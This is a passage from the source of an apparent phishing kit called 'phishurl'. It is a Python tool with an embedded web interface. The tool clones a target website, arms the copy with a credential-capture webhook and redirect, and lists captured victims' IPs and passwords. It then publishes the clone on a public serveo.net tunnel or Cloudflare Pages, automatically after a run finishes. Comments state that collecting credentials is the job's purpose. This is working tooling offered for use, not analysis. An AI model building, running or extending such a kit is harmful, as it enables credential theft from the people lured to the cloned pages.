  const detail = document.createElement('span');
  detail.textContent = [hit.ip || 'ip unknown', hit.page || ''].filter(Boolean).join(' · ');
  who.appendChild(address);
  who.appendChild(detail);
  const secret = document.createElement('div');
  secret.className = 'key';
  secret.textContent = hit.password || '(empty)';
  row.appendChild(when);
  row.appendChild(who);
  row.appendChild(secret);
  list.insertBefore(row, list.firstChild);

  $('#hit-count').textContent = state.hits.length + (state.hits.length === 1 ? ' hit' : ' hits');
  $('#hits-copy').disabled = false;
  $('#hits').classList.remove('hidden');
  // the counter rides in the header so a hit is visible from anywhere on the page;
  // the chip is an anchor, so the jump back down to the row costs no script
  const chip = $('#hits-chip');
  if (chip) {
    $('span', chip).textContent = state.hits.length +
      (state.hits.length === 1 ? ' capture' : ' captures');
    chip.hidden = false;
  }
}

function clearHits() {
  state.hits = [];
  state.hitKeys = new Set();
  $('#hits-list').innerHTML = '<div class="hit-empty">nothing captured yet — open the mirror, ' +
    'type into the form, press its button</div>';
  $('#hit-count').textContent = '0 hits';
  $('#hits-copy').disabled = true;
  const chip = $('#hits-chip');
  if (chip) chip.hidden = true;
}

/* ── result ──────────────────────────────────────────────────────────── */
function showResult(event) {
  const result = $('#result');
  result.classList.remove('hidden');
  // the stage had no measurable width while it was hidden; the frame is fitted
  // the moment it can be measured
  fitDevice();
  const url = event.url || '';
  const badge = $('#result-badge');
  const counts = event.counts || {};
  const gates = event.gates || {};
  const gateText = Object.keys(gates).length
    ? Object.entries(gates).map(([name, score]) => name + ' ' + Math.round(score * 100) + '%').join(' · ')
    : '';

  if (event.status === 'failed') {
    badge.className = 'badge dead';
    badge.textContent = 'stopped';
    $('#result-title').textContent = 'the mirror did not run';
    $('#result-note').textContent = event.error || 'the job stopped before it finished';
    $('#result-url').textContent = '—';
    $('#open').style.display = 'none';
    $('#dl').style.display = 'none';
    $('#mirror-path').textContent = '';
    $('#publish-box').classList.add('hidden');
    const dead = $('#frame');
    dead.removeAttribute('src');
    dead.dataset.live = '';
    result.scrollIntoView({ behavior: 'smooth', block: 'center' });
    return;
  }

  $('#publish-box').classList.remove('hidden');
  if (url) {
    badge.className = 'badge';
    badge.textContent = 'live';
    $('#result-title').textContent = 'the mirror is live';
    $('#result-note').textContent = (event.seconds ? event.seconds + 's · ' : '') +
      (counts.assets || 0) + ' assets · ' + fmtBytes(counts.bytes || 0) +
      (gateText ? ' · ' + gateText : '');
    $('#result-url').textContent = url;
    $('#open').href = url;
    $('#open').style.display = '';
    $('#copy').textContent = 'copy';
    $('#mirror-path').textContent = event.mirror ? 'source folder · ' + event.mirror : '';
    const frame = $('#frame');
    frame.src = url;
    frame.dataset.live = '1';
  } else {
    badge.className = 'badge';
    badge.textContent = 'built';
    $('#result-title').textContent = 'the mirror is on disk';
    $('#result-note').textContent = (counts.assets || 0) + ' assets · ' +
      fmtBytes(counts.bytes || 0) + (gateText ? ' · ' + gateText : '');
    // no public url: the local row points at the app's own preview, which opens
    const preview = location.origin + '/api/jobs/' + state.job + '/preview/';
    $('#result-url').textContent = preview;
    $('#open').href = preview;
    $('#open').style.display = '';
    $('#copy').textContent = 'copy';
    $('#mirror-path').textContent = event.mirror ? 'source folder · ' + event.mirror : '';
    // far better than framing a blank box — the route resolves the entry file
    const local = $('#frame');
    local.src = '/api/jobs/' + state.job + '/preview/';
    local.dataset.live = '';
  }
  $('#dl').style.display = '';
  $('#dl').href = '/api/jobs/' + state.job + '/export.zip';
  result.scrollIntoView({ behavior: 'smooth', block: 'center' });
}

/* ── stream ──────────────────────────────────────────────────────────── */
function handle(name, data) {
  switch (name) {
    case 'snapshot':
      if (data.counts) setCounters(data.counts);
      if (data.pages) $('#c-pages').textContent = data.pages.length;
      (data.assets || []).forEach(upsertAsset);
      Object.values(data.gates || {}).forEach(setGate);
      (data.heals || []).forEach(addHeal);
      (data.hits || []).forEach(addHit);
      if (data.phase) setPhase(data.phase);
      break;
    case 'phase':
      setPhase(data.phase);
      if (data.note) logLine('phase ' + data.phase + ' · ' + data.note);
      break;
    case 'log':
      logLine(data.message, data.level);
      break;
    case 'asset':
      upsertAsset(data);
      break;
    case 'page':
      $('#c-pages').textContent =
        Number($('#c-pages').textContent || 0) + (data.status === 'done' ? 1 : 0);
      logLine('page ' + (data.local || data.url) + ' · ' + fmtBytes(data.size || 0));
      break;
    case 'progress':
      setCounters(data);
      break;
    case 'gate':
      setGate(data);
      break;
    case 'heal':
      addHeal(data);
      break;
    case 'hit':
      addHit(data);
      break;
    case 'deploy':
      logLine('deploy ' + (data.status || '') + (data.project ? ' · ' + data.project : '') +
              (data.url ? ' · ' + data.url : '') + (data.error ? ' · ' + data.error : ''),
              data.status === 'success' ? 'ok' : 'info');
      break;
    case 'package':
      logLine('package · ' + data.files + ' files · ' + fmtBytes(data.bytes || 0), 'ok');
      break;
    case 'error':
      logLine('error · ' + data.message, 'error');
      break;
    case 'done':
      finish(data);
      break;
  }
}

function finish(data) {
  state.done = true;
  // the stream stays open: a run that has finished is still the run that collects
  // the credentials, and closing the feed here is why hits never reached the card
  const failed = data.status === 'failed';
  if (!failed) {
    setPhase('package');
    $('#bar').style.width = '100%';
  }
  const final = data.counts || {};
  setCounters({ assets: final.assets, bytes: final.bytes, failures: final.failed,
                done: final.assets });
  Object.entries(data.gates || {}).forEach(([name, score]) =>
    setGate({ name, score, passed: score >= 1 }));
  $('#go').disabled = false;
  $('#go').textContent = 'clone';
  showResult(data);
  if (failed) {
    logLine('job failed · ' + (data.error || 'unknown'), 'error');
    return;
  }
  // the pill is the click: a finished run goes public without being asked again
  if ($('#opt-tunnel').checked) publish();
}

function stream(jobId) {
  if (state.es) state.es.close();
  const source = new EventSource('/api/jobs/' + jobId + '/stream');
  state.es = source;
  ['snapshot', 'phase', 'log', 'asset', 'page', 'progress', 'gate', 'heal', 'hit', 'deploy',
   'package', 'error', 'done'].forEach((name) => {
    source.addEventListener(name, (event) => {
      let payload = {};
      try { payload = JSON.parse(event.data || '{}'); } catch (err) { payload = {}; }
      handle(name, payload);
    });
  });
  source.onerror = () => {
    if (!state.done) logLine('stream interrupted — the browser will retry', 'warn');
  };
}

/* ── clone ───────────────────────────────────────────────────────────── */
async function startClone() {
  const input = $('#url');
  const raw = input.value.trim();
  if (!raw) {
    input.focus();
    input.style.borderColor = 'rgba(255,84,112,.9)';
    setTimeout(() => { input.style.borderColor = ''; }, 900);
    return;
  }
  const capture = captureValues();
  const options = {
    url: raw,
    render: $('#opt-render').checked,
    sanitize: $('#opt-sanitize').checked,
    deploy: $('#opt-deploy').checked,
    project: $('#opt-project').value.trim(),
    proxy: $('#opt-proxy').value.trim(),
    max_assets: parseInt($('#opt-max').value, 10) || 5000,
    depth: parseInt($('#opt-depth').value, 10) || 1,
    webhook: capture.webhook,
    redirect: capture.redirect
  };

  state.assets = new Map();
  state.rows = [];
  state.done = false;
  clearHits();
  // the capture card is up from the first second of an armed run. it used to be
  // hidden until a hit landed, which hid the one surface the job exists for.
  $('#hits').classList.toggle('hidden', !capture.webhook);
  $('#discovery').innerHTML = '';
  $('#log').innerHTML = '';
  $('#d-count').textContent = '0 urls';
  $('#timeline').innerHTML = '<div class="tl-empty">waiting for the first gate pass</div>';
  $$('.gate').forEach((card) => {
    card.className = 'gate measuring';
    card.querySelector('.val').textContent = '—';
    card.querySelector('.bar-mini i').style.width = '0%';
  });
  $('#heal-score').textContent = 'score —';
  resetPublish();
  $('#result').classList.add('hidden');
  $('#stage-idle').classList.add('hidden');
  $('#console').classList.remove('hidden');
  $('#heal').classList.remove('hidden');
  setCounters({ pages: 0, assets: 0, bytes: 0, failed: 0, done: 0 });
  $('#bar').style.width = '4%';
  setPhase('render');
  $('#go').disabled = true;
  $('#go').textContent = 'working';
  $('#console').scrollIntoView({ behavior: 'smooth', block: 'start' });

  try {
    const reply = await api('/api/jobs', options);
    state.job = reply.job_id;
    $('#job-id').textContent = reply.job_id;
    logLine('job ' + reply.job_id + ' · ' + reply.url, 'ok');
    if (capture.webhook) logLine('capture · armed → ' + hostOf(capture.webhook), 'ok');
    if (reply.project) logLine('project target · ' + reply.project);
    stream(reply.job_id);
  } catch (error) {
    logLine('could not start · ' + error.message, 'error');
    $('#go').disabled = false;
    $('#go').textContent = 'clone';
  }
}

/* ── the look ────────────────────────────────────────────────────────── */
/* a palette is two colours. everything else is derived: the third accent is
   their mix, and every translucent edge in the sheet reads the channel
   triplet, so one pick repaints the glass, the glow and the swatches together. */
const PRESETS = {
  aurora: ['#7c5cff', '#22d3ee'],
  ember: ['#ff7a45', '#ffc35a'],
  ice: ['#5b9cff', '#8ef5ff'],
  toxic: ['#33ff9e', '#8bffcf'],
  sunset: ['#ff5f9e', '#ffb36b'],
  mono: ['#e9ecf5', '#97a2bd']
};
let theme = { preset: 'aurora', accent: PRESETS.aurora[0], accent2: PRESETS.aurora[1],
              dim: 36, wall: '' };

function triplet(hex) {
  const value = String(hex || '').replace('#', '');
  if (!/^[0-9a-f]{6}$/i.test(value)) return '124,92,255';
  return [0, 2, 4].map((index) => parseInt(value.slice(index, index + 2), 16)).join(',');
}

function blend(one, two) {
  const a = triplet(one).split(',').map(Number);
  const b = triplet(two).split(',').map(Number);
  return '#' + a.map((value, index) =>
    Math.round(value * 0.45 + b[index] * 0.55).toString(16).padStart(2, '0')).join('');
}

function applyTheme(next) {
  theme = Object.assign({}, theme, next || {});
  const root = document.documentElement.style;
  const third = blend(theme.accent, theme.accent2);
  root.setProperty('--a1', theme.accent);
  root.setProperty('--a2', theme.accent2);
  root.setProperty('--a3', third);
  root.setProperty('--a1-rgb', triplet(theme.accent));
  root.setProperty('--a2-rgb', triplet(theme.accent2));
  root.setProperty('--a3-rgb', triplet(third));
  root.setProperty('--wall', theme.wall ? 'url("' + theme.wall + '")' : 'none');
  root.setProperty('--wall-a', theme.wall ? '1' : '0');
  root.setProperty('--wall-dim', (Number(theme.dim) / 100).toFixed(2));
  document.body.classList.toggle('walled', !!theme.wall);
  paintTheme();
}

function paintTheme() {
  $$('#presets button').forEach((button) => {
    button.classList.toggle('on', button.dataset.preset === theme.preset);
  });
  $('#t-accent').value = theme.accent;
  $('#t-accent2').value = theme.accent2;
  $('#t-accent-v').textContent = theme.accent;
  $('#t-accent2-v').textContent = theme.accent2;
  $('#t-dim').value = theme.dim;
  $('#t-dim-v').textContent = theme.dim + '%';
  $('#wall-name').textContent = theme.wall
    ? 'set · drop another picture to replace it'
    : 'drop a picture, or click to choose';
}

function themeNote(text, ok) {
  const out = $('#theme-out');
  out.className = 'mini ' + (ok ? 'ok' : 'bad');
  out.textContent = text || '';
}

function loadTheme() {
  api('/api/theme').then(applyTheme)
    .catch((error) => logLine('theme · ' + error.message, 'warn'));
}

function openSettings() {
  $('#settings').classList.remove('hidden');
  themeNote('', true);
  paintTheme();
}

async function saveTheme() {
  try {
    const reply = await api('/api/theme', { preset: theme.preset, accent: theme.accent,
                                            accent2: theme.accent2, dim: theme.dim });
    applyTheme(reply);
    themeNote('saved to config.yaml', true);
    logLine('theme saved · ' + reply.preset, 'ok');
    setTimeout(closeSettings, 650);
  } catch (error) {
    themeNote(error.message, false);
  }
}

async function sendWall(file) {
  if (!file) return;
  if (!/^image\//.test(file.type)) { themeNote('that file is not an image', false); return; }
  if (file.size > 12 * 1024 * 1024) { themeNote('the image is over 12 mb', false); return; }
  themeNote('uploading…', true);
  const data = await new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onload = () => resolve(reader.result);
    reader.onerror = () => reject(new Error('the file could not be read'));
    reader.readAsDataURL(file);
  }).catch((error) => { themeNote(error.message, false); return null; });
  if (!data) return;
  try {
    applyTheme(await api('/api/theme/wall', { data: data, name: file.name }));
    themeNote('wallpaper saved', true);
  } catch (error) {
    themeNote(error.message, false);
  }
}

async function clearWall() {
  try {
    applyTheme(await api('/api/theme/wall', undefined, 'DELETE'));
    themeNote('wallpaper cleared', true);
  } catch (error) {
    themeNote(error.message, false);
  }
}

function pickPreset(name) {
  const pair = PRESETS[name];
  if (!pair) return;
  applyTheme({ preset: name, accent: pair[0], accent2: pair[1] });
}

function closeSettings() { $('#settings').classList.add('hidden'); }

function bindWallDrop() {
  const drop = $('#wall-drop');
  const send = (event) => {
    event.preventDefault();
    drop.classList.remove('over');
    const file = event.dataTransfer && event.dataTransfer.files && event.dataTransfer.files[0];
    if (file) sendWall(file);
  };
  drop.addEventListener('click', (event) => {
    if (event.target.closest('#wall-clear')) return;
    $('#wall-file').click();
  });
  drop.addEventListener('dragover', (event) => {
    event.preventDefault();
    drop.classList.add('over');
  });
  drop.addEventListener('dragleave', () => drop.classList.remove('over'));
  drop.addEventListener('drop', send);
}

function setTunnelChip(sshOk, live) {
  const chip = $('#tunnel-chip');
  chip.className = 'chip ' + (sshOk ? 'ok' : 'bad');
  chip.querySelector('span').textContent = !sshOk ? 'no ssh'
    : (live ? 'tunnel live' : 'tunnel ready');
}

/* the rail states the ceilings the run will actually use, not the ones that were
   true when the markup was written */
function paintLimits(max, parallel) {
  $('#stat-assets').textContent = String(max).replace(/\B(?=(\d{3})+(?!\d))/g, ' ');
  $('#stat-parallel').textContent = 'assets · ' + parallel + ' parallel';
}

/* ── wiring ──────────────────────────────────────────────────────────── */
function bindPill(id) {
  const pill = $(id);
  const box = pill.querySelector('input');
  const sync = () => pill.classList.toggle('on', box.checked);
  box.addEventListener('change', sync);
  pill.addEventListener('click', (event) => {
    if (event.target !== box && event.target.tagName !== 'INPUT') {
      event.preventDefault();
      box.checked = !box.checked;
      sync();
    }
  });
  sync();
}

function syncScheme() {
  // The box in front of the input is not decoration: a bare host gets http on
  // loopback and https everywhere else, and the chip says which one will be used.
  const value = $('#url').value.trim();
  const chip = $('.input-wrap .scheme');
  if (!value) { chip.textContent = 'https://'; return; }
  if (value.indexOf('://') > -1) { chip.textContent = ''; return; }
  chip.textContent = /^(localhost|127\.|0\.0\.0\.0|\[::1\])/i.test(value) ? 'http://' : 'https://';
}

/* ── preview stage ────────────────────────────────────────────────────── */
/* the mirrored page is laid out at its real viewport size inside .device and
   the whole frame is scaled to fit the stage. Resizing an iframe instead makes
   it reflow, which shows a different page than the one that was captured — and
   a fixed width with no height crops it to the top-left corner. */
const VIEWPORTS = { '1440': [1440, 900], '820': [820, 1100], '420': [420, 880] };
let vpWidth = '1440';

function fitDevice() {
  const wrap = $('#frame-wrap');
  const device = $('#device');
  if (!wrap || !device || !wrap.clientWidth) return;
  const [vw, vh] = VIEWPORTS[vpWidth] || VIEWPORTS['1440'];
  const availW = Math.max(120, wrap.clientWidth - 36);
  const availH = Math.max(120, wrap.clientHeight - 36);
  const scale = Math.min(availW / vw, availH / vh);
  device.style.width = vw + 'px';
  device.style.height = vh + 'px';
  device.style.transform = 'translate(-50%,-50%) scale(' + scale.toFixed(4) + ')';
}

function init() {
  ['#pill-tunnel', '#pill-render', '#pill-sanitize', '#pill-deploy'].forEach(bindPill);
  $('#go').addEventListener('click', startClone);
  $('#url').addEventListener('keydown', (event) => {
    if (event.key === 'Enter') startClone();
  });
  $('#adv-toggle').addEventListener('click', () => {
    const adv = $('#adv');
    adv.classList.toggle('hidden');
    $('#adv-toggle').textContent = adv.classList.contains('hidden') ? 'advanced' : 'less';
  });
  $('#log-filter').addEventListener('input', applyFilter);
  $('#url').addEventListener('input', syncScheme);
  syncScheme();
  $('#pub').addEventListener('click', publish);
  $('#pub-stop').addEventListener('click', stopPublish);
  $('#pub-copy').addEventListener('click', async () => {
    const button = $('#pub-copy');
    try {
      await navigator.clipboard.writeText($('#pub-url').textContent);
      button.textContent = 'copied';
      setTimeout(() => { button.textContent = 'copy'; }, 1400);
    } catch (error) {
      logLine('clipboard refused · select the link and copy it', 'warn');
    }
  });
  $('#pub-link').addEventListener('click', (event) => {
    if (!event.currentTarget.getAttribute('href')) event.preventDefault();
  });
  $('#open-settings').addEventListener('click', openSettings);
  $('#close-settings').addEventListener('click', closeSettings);
  $('#save').addEventListener('click', saveTheme);
  $('#theme-reset').addEventListener('click', () => {
    applyTheme({ preset: 'aurora', accent: PRESETS.aurora[0],
                 accent2: PRESETS.aurora[1], dim: 36 });
    saveTheme();
  });
  $$('#presets button').forEach((button) => {
    button.addEventListener('click', () => pickPreset(button.dataset.preset));
  });
  $('#t-accent').addEventListener('input', (event) => {
    applyTheme({ preset: 'custom', accent: event.target.value });
  });
  $('#t-accent2').addEventListener('input', (event) => {
    applyTheme({ accent2: event.target.value });
  });
  $('#t-dim').addEventListener('input', (event) => {
    applyTheme({ dim: Number(event.target.value) });
  });
  $('#wall-file').addEventListener('change', (event) => sendWall(event.target.files[0]));
  $('#wall-clear').addEventListener('click', (event) => {
    event.stopPropagation();
    clearWall();
  });
  bindWallDrop();
  loadTheme();
  $('#settings').addEventListener('click', (event) => {
    if (event.target === $('#settings')) closeSettings();
  });
  document.addEventListener('keydown', (event) => {
    if (event.key === 'Escape') closeSettings();
  });
  $('#copy').addEventListener('click', async () => {
    const value = $('#result-url').textContent;
    try {
      await navigator.clipboard.writeText(value);
      $('#copy').textContent = 'copied';
      setTimeout(() => { $('#copy').textContent = 'copy'; }, 1400);
    } catch (error) {
      logLine('clipboard refused · select the url and copy it', 'warn');
    }
  });
  $$('#vp button').forEach((button) => {
    button.addEventListener('click', () => {
      $$('#vp button').forEach((other) => other.classList.remove('on'));
      button.classList.add('on');
      vpWidth = button.dataset.w;
      fitDevice();
    });
  });
  // on a handset the desktop preset is a 20% thumbnail; the preview opens on
  // the viewport the person is actually holding
  if (window.innerWidth < 760) {
    vpWidth = '420';
    $$('#vp button').forEach((other) => other.classList.toggle('on', other.dataset.w === '420'));
  }
  fitDevice();
  window.addEventListener('resize', fitDevice);

  // capture panel: the webhook lives in the browser, not in config.yaml, so a
  // mirror is armed before the clone starts and the setting outlives the tab
  ['#opt-webhook', '#opt-redirect'].forEach((sel) => {
    $(sel).addEventListener('input', storeCapture);
    $(sel).addEventListener('blur', storeCapture);
  });
  loadCapture();
  clearHits();
  $('#hits-copy').addEventListener('click', async () => {
    const value = state.hits.map(hitLine).join('\n');
    if (!value) return;
    try {
      await navigator.clipboard.writeText(value);
      const button = $('#hits-copy');
      button.textContent = 'copied';
      setTimeout(() => { button.textContent = 'copy all'; }, 1400);
    } catch (error) {
      logLine('clipboard refused · select the rows and copy them', 'warn');
    }
  });

  api('/api/health').then((data) => {
    const tunnel = data.tunnel || {};
    setTunnelChip(!!tunnel.ssh, !!tunnel.live);
    $('#ver').textContent = data.version || '1.0.0';
    $('#year').textContent = new Date().getFullYear();
    logLine('phishurl ' + data.version + ' · ssh ' + (tunnel.ssh ? 'ready' : 'missing') +
            ' · out ' + data.out_dir);
  }).catch((error) => logLine('health · ' + error.message, 'warn'));

  api('/api/settings').then((data) => {
    const cfg = (data && data.config) || {};
    const max = Number(cfg.max_assets) || 5000;
    const parallel = Number(cfg.concurrency) || 8;
    $('#opt-max').value = max;
    paintLimits(max, parallel);
  }).catch(() => paintLimits(5000, 8));
}

document.addEventListener('DOMContentLoaded', init);
</script>
</body>
</html>
"""

# ---------------------------------------------------------------------------
# 16. CLI
# ---------------------------------------------------------------------------


def _print_report(job: Job) -> None:
    """Console report: one row per asset when rich is here, plain lines otherwise."""
    rows = sorted(job.assets.values(), key=lambda asset: (asset.status, asset.local or asset.url))
    if rich is not None:
        from rich.console import Console
        from rich.table import Table
        console = Console()
        table = Table(title=f"{job.options.url} → {job.mirror}", header_style="bold cyan",
                      border_style="bright_black", title_style="bold")
        table.add_column("status", style="bold", width=11)
        table.add_column("kind", width=8)
        table.add_column("size", justify="right", width=10)
        table.add_column("local path", overflow="fold")
        palette = {"done": "green", "failed": "red", "placeholder": "yellow",
                   "pending": "dim", "fetching": "cyan"}
        for asset in rows[:400]:
            style = palette.get(asset.status, "white")
            table.add_row(f"[{style}]{asset.status}[/{style}]", asset.kind,
                          human_bytes(asset.size), asset.local or asset.url)
        console.print(table)
        gates = " · ".join(f"{name} {gate['score']:.2f}"
                           for name, gate in job.gates.items())
        console.print(f"[bold]{len(rows)} assets[/bold] · "
                      f"{human_bytes(job.bytes)} · {job.failures} failed · gates {gates}")
        if job.url:
            console.print(f"[bold green]live[/bold green] {job.url}")
        elif getattr(job.deployment, "error", ""):
            console.print(f"[yellow]deploy skipped[/yellow] {job.deployment.error}")
        return

    for asset in rows[:400]:
        print(f"{asset.status:<12}{asset.kind:<8}{human_bytes(asset.size):>10}  "
              f"{asset.local or asset.url}")
    print(f"\n{len(rows)} assets · {human_bytes(job.bytes)} · {job.failures} failed")
    if job.url:
        print(f"live {job.url}")


def _serve_public(root: Path, subdomain: str = "") -> int:
    """Hold a folder open on serveo.net until ctrl-c. The printed url is the point."""
    site = PublicSite(root, subdomain)
    try:
        url = site.start()
    except TunnelError as exc:
        print(f"tunnel failed · {exc}", file=sys.stderr)
        return 1
    port = site.server.port if site.server else 0
    print(f"public   {url}")
    print(f"local    http://127.0.0.1:{port}/")
    print("ctrl-c to close")
    try:
        while site.process is not None and site.process.poll() is None:
            time.sleep(1.0)
        print("serveo closed the forward", file=sys.stderr)
    except KeyboardInterrupt:
        print("\nclosing")
    finally:
        site.stop()
    return 0


def cmd_tunnel(args: argparse.Namespace) -> int:
    root = Path(args.dir).expanduser().resolve()
    if not root.is_dir():
        print(f"not a directory: {root}", file=sys.stderr)
        return 2
    return _serve_public(root, args.subdomain or "")


def cmd_clone(args: argparse.Namespace) -> int:
    options = Options.from_payload({
        "url": args.url, "render": not args.no_render, "sanitize": not args.no_sanitize,
        "deploy": args.deploy, "project": args.project or "", "proxy": args.proxy or "",
        "depth": args.depth, "max_assets": args.max_assets,
    })
    job = make_job(options)
    job.subscribe()       # nothing reads it in CLI mode; a subscriber keeps the queue warm
    orchestrator = Orchestrator(CONFIG)

    def progress(event: dict[str, Any]) -> None:
        if event.get("event") != "log":
            return
        level = event.get("level", "info")
        if level == "debug":
            return
        prefix = {"warn": "!", "error": "x", "ok": "+"}.get(level, "·")
        stream = sys.stderr if level in ("warn", "error") else sys.stdout
        print(f"{prefix} {event.get('message')}", file=stream)

    original_emit = job.emit

    def emit_both(event: dict[str, Any]) -> None:
        original_emit(event)
        progress(event)

    job.emit = emit_both       # type: ignore[method-assign]

    try:
        asyncio.run(orchestrator.run(job))
    except KeyboardInterrupt:
        print("interrupted", file=sys.stderr)
        return 130

    if args.json:
        manifest = Path(job.mirror) / "manifest.json"
        print(read_text(manifest) or json.dumps(job.snapshot(), indent=2))
    else:
        _print_report(job)
        print(f"mirror  {job.mirror}")
        print(f"zip     {job.zip_path}")
    if getattr(args, "tunnel", False) and job.mirror and Path(job.mirror).is_dir():
        return _serve_public(Path(job.mirror), getattr(args, "subdomain", "") or "")
    return 0 if job.status == "done" else 1


def cmd_deploy(args: argparse.Namespace) -> int:
    source = Path(args.dir).expanduser().resolve()
    if not source.is_dir():
        print(f"not a directory: {source}", file=sys.stderr)
        return 2
    if getattr(args, "tunnel", False):
        # serveo before cloudflare: a public url needs no account and no token, and a
        # folder that is already on disk is already a site.
        return _serve_public(source, getattr(args, "subdomain", "") or "")
    if not CONFIG.has_cloudflare():
        print("deploy skipped: no credentials (set CF_API_TOKEN and CF_ACCOUNT_ID)",
              file=sys.stderr)
        return 2

    zip_path = source.parent / (source.name + ".zip")
    with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as archive:
        for path in sorted(source.rglob("*")):
            if path.is_file():
                archive.write(path, arcname=path.relative_to(source).as_posix())
    print(f"packaged {zip_path} · {human_bytes(zip_path.stat().st_size)}")

    project = slugify(args.project or source.name)

    async def run() -> int:
        client = Cloudflare(CONFIG.cf_api_token, CONFIG.cf_account_id)
        events: list[dict[str, Any]] = []

        def sink(event: dict[str, Any]) -> None:
            events.append(event)
            if event.get("event") == "log":
                print(f"· {event.get('message')}")
            elif event.get("event") == "deploy" and event.get("url"):
                print(f"+ {event['status']} {event['url']}")

        try:
            record = await client.deploy(project, zip_path.read_bytes(), sink)
        except CloudflareError as exc:
            print(f"deploy failed: {exc}", file=sys.stderr)
            return 1
        print(f"live {record.url}")
        return 0

    return asyncio.run(run())


def cmd_serve(args: argparse.Namespace) -> int:
    if uvicorn_mod is None:
        print("uvicorn is not installed — pip install fastapi uvicorn", file=sys.stderr)
        return 2
    if sys.platform == "win32":
        # playwright drives a subprocess; the proactor policy is the one that allows it
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    import uvicorn
    app = build_app(CONFIG)
    shown = f"http://{args.host}:{args.port}"
    print(f"{APP} {VERSION} · {TAGLINE}")
    print(f"  ui        {shown}")
    print(f"  cloudflare {'configured' if CONFIG.has_cloudflare() else 'missing credentials'}")
    print(f"  output    {Path(CONFIG.out_dir or OUT_ROOT).resolve()}")
    uvicorn.run(app, host=args.host, port=args.port, log_level=args.log_level,
                access_log=False)
    return 0


def cmd_doctor(_args: argparse.Namespace) -> int:
    import platform
    print(f"{APP} {VERSION} · python {platform.python_version()} · {platform.system()}")
    for name, present in sorted(CAPS.items()):
        print(f"  {'ok  ' if present else 'MISS'} {name}")
    print(f"  cloudflare {'configured' if CONFIG.has_cloudflare() else 'missing credentials'}")
    print(f"  out_dir    {Path(CONFIG.out_dir or OUT_ROOT).resolve()}")
    if not CAPS.get("playwright"):
        print("hint: pip install playwright && python -m playwright install chromium")
    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(prog=APP, description="mirror a page, heal it, deploy it")
    parser.add_argument("--version", action="version", version=f"{APP} {VERSION}")
    sub = parser.add_subparsers(dest="command")

    serve = sub.add_parser("serve", help="web UI on http://127.0.0.1:8000")
    serve.add_argument("--port", type=int, default=8000)
    serve.add_argument("--host", default="127.0.0.1")
    serve.add_argument("--log-level", default="warning",
                       choices=["critical", "error", "warning", "info", "debug"])
    serve.set_defaults(func=cmd_serve)

    clone = sub.add_parser("clone", help="mirror a url from the terminal")
    clone.add_argument("url")
    clone.add_argument("--out", default="", help="parent directory for the mirror")
    clone.add_argument("--proxy", default="")
    clone.add_argument("--no-sanitize", action="store_true")
    clone.add_argument("--no-render", action="store_true")
    clone.add_argument("--deploy", action="store_true")
    clone.add_argument("--project", default="")
    clone.add_argument("--depth", type=int, default=1)
    clone.add_argument("--max-assets", type=int, default=5000)
    clone.add_argument("--json", action="store_true", help="print the manifest instead of a table")
    clone.add_argument("--tunnel", action="store_true",
                       help="keep the mirror on a public serveo.net url when it is built")
    clone.add_argument("--subdomain", default="", help="preferred serveo subdomain")
    clone.set_defaults(func=cmd_clone)

    deploy = sub.add_parser("deploy", help="publish an existing mirror directory")
    deploy.add_argument("dir")
    deploy.add_argument("--project", default="")
    deploy.add_argument("--tunnel", action="store_true",
                        help="serve the folder on serveo.net instead of cloudflare")
    deploy.add_argument("--subdomain", default="", help="preferred serveo subdomain")
    deploy.set_defaults(func=cmd_deploy)

    tunnel = sub.add_parser("tunnel", help="serve a folder on a public serveo.net url")
    tunnel.add_argument("dir")
    tunnel.add_argument("--subdomain", default="", help="preferred serveo subdomain")
    tunnel.set_defaults(func=cmd_tunnel)

    doctor = sub.add_parser("doctor", help="what is installed and what is configured")
    doctor.set_defaults(func=cmd_doctor)
    return parser


def main(argv: Optional[list[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    if not getattr(args, "command", None):
        parser.print_help()
        return 0
    if getattr(args, "out", ""):
        CONFIG.out_dir = args.out
    try:
        return int(args.func(args) or 0)
    except KeyboardInterrupt:
        return 130
    except Exception as exc:
        print(f"{APP}: {type(exc).__name__}: {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
